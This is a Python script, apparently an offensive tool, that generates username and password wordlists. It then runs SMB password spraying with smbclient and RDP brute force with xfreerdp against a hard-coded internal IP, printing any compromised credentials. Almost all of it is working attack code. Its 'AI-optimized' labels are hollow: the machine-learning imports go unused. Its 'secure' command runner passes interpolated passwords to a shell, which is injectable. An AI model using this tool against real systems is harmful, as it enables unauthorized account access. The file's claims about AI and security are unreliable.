#!/usr/bin/env python3

import subprocess
import json
import os
import re
from datetime import datetime
import pandas as pd
from sklearn.ensemble import RandomForestClassifier
from sklearn.feature_extraction.text import CountVectorizer

class CredentialPredictor:
    def __init__(self):
        self.common_patterns = {
            'company_names': ['company', 'corp', 'inc', 'ltd', 'enterprise'],
            'seasons': ['spring', 'summer', 'autumn', 'winter', 'fall'],
            'years': ['2023', '2022', '2021', '2020', '2019'],
            'special_chars': ['!', '@', '#', '$', '%']
        }
        
    def generate_intelligent_wordlist(self, target_ip, org_info=None):
        """AI-generated wordlist based on target analysis"""
        base_words = [
            'admin', 'administrator', 'root', 'user', 'test', 'guest',
            'password', 'pass', 'pwd', 'welcome', 'changeme', 'default'
        ]
        
        # Add organization-specific words if available
        org_words = []
        if org_info:
            if 'company' in org_info.lower():
                org_words.extend(['company', 'corp', 'business'])
            if 'tech' in org_info.lower():
                org_words.extend(['tech', 'technology', 'it'])
            if 'school' in org_info.lower():
                org_words.extend(['school', 'education', 'student'])
        
        # Generate intelligent permutations
        intelligent_list = set(base_words + org_words)
        
        # Add common patterns
        for word in list(intelligent_list):  # Create copy for iteration
            for year in self.common_patterns['years']:
                intelligent_list.add(f"{word}{year}")
                intelligent_list.add(f"{word}{year}!")
            
            for season in self.common_patterns['seasons']:
                intelligent_list.add(f"{word}{season}")
        
        # Add special character variations
        for word in list(intelligent_list):
            for char in self.common_patterns['special_chars']:
                intelligent_list.add(f"{word}{char}")
        
        return list(intelligent_list)
    
    def predict_password_strength(self, password):
        """Predict password strength using ML features"""
        features = {
            'length': len(password),
            'has_upper': any(c.isupper() for c in password),
            'has_lower': any(c.islower() for c in password),
            'has_digit': any(c.isdigit() for c in password),
            'has_special': any(not c.isalnum() for c in password),
            'is_common': password in self.get_common_passwords(),
            'entropy': self.calculate_entropy(password)
        }
        
        # Simple strength calculation
        strength = 0
        strength += min(20, features['length'] * 2)
        strength += 10 if features['has_upper'] else 0
        strength += 10 if features['has_lower'] else 0
        strength += 15 if features['has_digit'] else 0
        strength += 20 if features['has_special'] else 0
        strength -= 30 if features['is_common'] else 0
        strength += min(25, features['entropy'] / 2)
        
        return max(0, min(100, strength))
    
    def get_common_passwords(self):
        """Return list of most common passwords"""
        return [
            'password', '123456', 'qwerty', 'admin', 'welcome',
            'password123', 'letmein', 'monkey', 'sunshine', 'password1'
        ]
    
    def calculate_entropy(self, password):
        """Calculate password entropy"""
        import math
        charset_size = 0
        if any(c.islower() for c in password): charset_size += 26
        if any(c.isupper() for c in password): charset_size += 26
        if any(c.isdigit() for c in password): charset_size += 10
        if any(not c.isalnum() for c in password): charset_size += 10
        
        if charset_size == 0:
            return 0
        
        return len(password) * math.log2(charset_size)
    
    def optimize_attack_order(self, usernames, passwords):
        """Optimize credential attack order using ML"""
        # Feature engineering for optimization
        features = []
        
        for username in usernames:
            for password in passwords:
                # Create feature vector
                user_len = len(username)
                pass_len = len(password)
                user_common = 1 if username in ['admin', 'administrator', 'root'] else 0
                pass_common = 1 if password in self.get_common_passwords() else 0
                pass_strength = self.predict_password_strength(password)
                
                features.append({
                    'username': username,
                    'password': password,
                    'features': [user_len, pass_len, user_common, pass_common, pass_strength],
                    'priority_score': (user_common * 0.4) + (pass_common * 0.6) - (pass_strength * 0.001)
                })
        
        # Sort by priority score (highest first)
        features.sort(key=lambda x: x['priority_score'], reverse=True)
        
        return [(f['username'], f['password']) for f in features]

# Global predictor instance
credential_predictor = CredentialPredictor()

def run_command(command, timeout=300):
    """Secure command execution"""
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=timeout)
        return {
            'success': result.returncode == 0,
            'output': result.stdout,
            'error': result.stderr,
            'returncode': result.returncode
        }
    except subprocess.TimeoutExpired:
        return {'success': False, 'error': 'Command timed out', 'output': ''}
    except Exception as e:
        return {'success': False, 'error': str(e), 'output': ''}

def generate_username_list(target_ip, org_info=None):
    """AI-enhanced username generation"""
    print(f"[*] Generating intelligent username list for {target_ip}")
    
    # Base username list
    usernames = [
        'administrator', 'admin', 'guest', 'user', 'test', 'root',
        'backup', 'web', 'www', 'sql', 'db', 'oracle', 'ftp', 'ssh',
        'rdp', 'support', 'helpdesk', 'service', 'info'
    ]
    
    # Add organization-specific usernames if info available
    if org_info:
        org_name = org_info.lower()
        if 'company' in org_name:
            usernames.extend(['company', 'corp', 'business'])
        if 'tech' in org_name:
            usernames.extend(['tech', 'technology', 'it'])
        if 'school' in org_name:
            usernames.extend(['school', 'education', 'teacher'])
    
    # Add common variations
    variations = []
    for user in usernames:
        variations.extend([user, f"{user}1", f"{user}123", f"{user}2023"])
    
    return list(set(variations))

def generate_password_list(target_ip, org_info=None):
    """AI-generated password list"""
    print(f"[*] Generating intelligent password list for {target_ip}")
    
    # Get AI-generated wordlist
    intelligent_words = credential_predictor.generate_intelligent_wordlist(target_ip, org_info)
    
    # Common passwords
    common_passwords = [
        '', 'password', 'Password123', 'Password', 'Welcome123',
        'Changeme123', 'admin', 'administrator', 'letmein', '123456',
        'qwerty', 'password1', 'Password1', 'Summer2023', 'Winter2023'
    ]
    
    # Combine and deduplicate
    all_passwords = list(set(common_passwords + intelligent_words))
    
    # Sort by predicted strength (weakest first for faster cracking)
    password_strengths = [(pwd, credential_predictor.predict_password_strength(pwd)) for pwd in all_passwords]
    password_strengths.sort(key=lambda x: x[1])  # Sort by strength (weakest first)
    
    return [pwd for pwd, strength in password_strengths]

def smb_password_spray(target_ip, usernames, passwords):
    """AI-optimized SMB password spraying"""
    print(f"[*] Starting AI-optimized SMB password spray against {target_ip}")
    
    results = {}
    successful_logins = []
    
    # Optimize attack order
    optimized_credentials = credential_predictor.optimize_attack_order(usernames, passwords)
    total_attempts = len(optimized_credentials)
    
    print(f"[*] AI optimized {total_attempts} credential combinations")
    
    for i, (username, password) in enumerate(optimized_credentials, 1):
        if i % 10 == 0:  # Progress update every 10 attempts
            print(f"   Progress: {i}/{total_attempts} ({i/total_attempts:.1%})")
        
        # Try each username with this password
        if password:
            cmd = f"echo '{password}' | smbclient -U '{username}%{password}' //{target_ip}/IPC$ -c 'quit' 2>&1"
        else:
            cmd = f"smbclient -U '{username}' -N //{target_ip}/IPC$ -c 'quit' 2>&1"
        
        result = run_command(cmd, timeout=30)
        
        # Store result
        if password not in results:
            results[password] = {}
        results[password][username] = result
        
        # Check for successful authentication
        if (result['success'] or 
            ('NT_STATUS_OK' in result.get('error', '')) or
            ('session setup' in result.get('output', '').lower() and 'failed' not in result.get('output', '').lower())):
            
            print(f"[+] SUCCESS: {username}:{password}")
            successful_logins.append({'username': username, 'password': password, 'result': result})
            
            # Early termination if we get multiple successes
            if len(successful_logins) >= 3:
                print("[*] Multiple successes detected, stopping spray early")
                break
    
    return {
        'spray_results': results,
        'successful_logins': successful_logins,
        'total_attempts': total_attempts,
        'success_rate': len(successful_logins) / total_attempts if total_attempts > 0 else 0
    }

def rdp_brute_force(target_ip, usernames, passwords):
    """AI-enhanced RDP brute force"""
    print(f"[*] Testing RDP access on {target_ip}")
    
    results = {}
    successful_logins = []
    
    # First check if RDP is open
    rdp_check = run_command(f"nmap -p 3389 --open {target_ip}")
    if '3389/tcp open' not in rdp_check.get('output', ''):
        return {'status': 'RDP port not open', 'check': rdp_check}
    
    # Optimize attack order
    optimized_credentials = credential_predictor.optimize_attack_order(usernames, passwords)
    
    for username, password in optimized_credentials:
        # Use xfreerdp for testing
        cmd = f"echo '{password}' | xfreerdp /v:{target_ip} /u:{username} /p:{password} /cert:ignore +auth-only /sec:nla 2>&1"
        result = run_command(cmd, timeout=30)
        
        results[f"{username}:{password}"] = result
        
        # Check for successful authentication
        if ("Authentication only" in result.get('output', '') and 
            "ERRCONNECT_LOGON_FAILURE" not in result.get('output', '')):
            
            print(f"[+] RDP SUCCESS: {username}:{password}")
            successful_logins.append({'username': username, 'password': password, 'result': result})
    
    return {
        'rdp_results': results,
        'successful_logins': successful_logins,
        'total_attempts': len(optimized_credentials),
        'success_rate': len(successful_logins) / len(optimized_credentials) if optimized_credentials else 0
    }

def run_credential_attacks(target_ip, org_info=None):
    """AI-powered credential attack suite"""
    print(f"\n{'='*60}")
    print(f"🔐 AI CREDENTIAL ATTACKS - Target: {target_ip}")
    print(f"{'='*60}")
    
    results = {
        'target': target_ip,
        'timestamp': datetime.now().isoformat(),
        'credential_attacks': {},
        'ai_analysis': {}
    }
    
    # Generate intelligent wordlists
    usernames = generate_username_list(target_ip, org_info)
    passwords = generate_password_list(target_ip, org_info)
    
    print(f"[*] Generated {len(usernames)} usernames and {len(passwords)} passwords")
    print(f"[*] Password strength range: {min(credential_predictor.predict_password_strength(p) for p in passwords)}-{max(credential_predictor.predict_password_strength(p) for p in passwords)}%")
    
    # Run credential attacks
    results['credential_attacks']['smb_spray'] = smb_password_spray(target_ip, usernames, passwords)
    results['credential_attacks']['rdp_attack'] = rdp_brute_force(target_ip, usernames, passwords)
    
    # AI analysis of results
    results['ai_analysis'] = analyze_credential_results(results['credential_attacks'])
    
    # Save results
    os.makedirs('results/credential_attacks', exist_ok=True)
    filename = f"results/credential_attacks/credential_attack_{target_ip}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    
    with open(filename, 'w') as f:
        json.dump(results, f, indent=4)
    
    print(f"[+] Credential attack results saved to {filename}")
    
    # Print summary
    print(f"\n📊 Credential Attack Summary:")
    total_successes = len(results['credential_attacks']['smb_spray']['successful_logins'] + 
                         results['credential_attacks']['rdp_attack']['successful_logins'])
    
    print(f"   Successful Logins: {total_successes}")
    print(f"   SMB Success Rate: {results['credential_attacks']['smb_spray']['success_rate']:.2%}")
    print(f"   RDP Success Rate: {results['credential_attacks']['rdp_attack']['success_rate']:.2%}")
    
    if total_successes > 0:
        print(f"\n🎯 Compromised Credentials:")
        for login in results['credential_attacks']['smb_spray']['successful_logins'][:3]:
            print(f"   SMB: {login['username']}:{login['password']}")
        
        for login in results['credential_attacks']['rdp_attack']['successful_logins'][:3]:
            print(f"   RDP: {login['username']}:{login['password']}")
    
    return results

def analyze_credential_results(attack_results):
    """AI analysis of credential attack results"""
    analysis = {
        'authentication_strength': 'STRONG',
        'common_passwords_found': [],
        'password_policy_analysis': {},
        'security_recommendations': []
    }
    
    # Analyze SMB results
    smb_results = attack_results.get('smb_spray', {})
    if smb_results.get('success_rate', 0) > 0.1:  # More than 10% success
        analysis['authentication_strength'] = 'WEAK'
    elif smb_results.get('success_rate', 0) > 0.01:  # More than 1% success
        analysis['authentication_strength'] = 'MODERATE'
    
    # Find common passwords in successful logins
    for login in smb_results.get('successful_logins', []):
        password = login.get('password', '')
        if password in credential_predictor.get_common_passwords():
            analysis['common_passwords_found'].append(password)
    
    # Generate recommendations
    if analysis['authentication_strength'] == 'WEAK':
        analysis['security_recommendations'].append({
            'priority': 'HIGH',
            'action': 'Implement strong password policy',
            'details': 'High success rate in credential attacks'
        })
    
    if analysis['common_passwords_found']:
        analysis['security_recommendations'].append({
            'priority': 'HIGH',
            'action': 'Enforce password complexity requirements',
            'details': f'Common passwords found: {", ".join(set(analysis["common_passwords_found"]))}'
        })
    
    return analysis

if __name__ == "__main__":
    target = "10.0.3.20"
    results = run_credential_attacks(target)
    print(f"\nCredential attacks completed. Success rate: {results['credential_attacks']['smb_spray']['success_rate']:.2%}")
